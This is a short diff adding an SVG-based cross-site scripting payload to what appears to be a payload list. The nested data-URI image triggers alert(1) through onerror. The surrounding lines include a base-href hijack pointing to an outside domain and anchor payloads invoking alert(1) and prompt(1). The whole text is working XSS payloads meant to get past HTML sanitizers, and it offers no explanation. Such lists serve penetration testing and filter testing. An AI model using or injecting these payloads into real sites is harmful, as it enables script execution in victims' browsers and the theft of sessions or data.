@@ -1,3 +1,4 @@
+<svg><use><set attributeName="href" to="data:image/svg+xml,&lt;svg id='x' xmlns="http://www.w3.org/2000/svg"&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
 <Base Href=//X55.is>
 <a/href="/alert(1)/">
 <a/href="/prompt(1)/"<
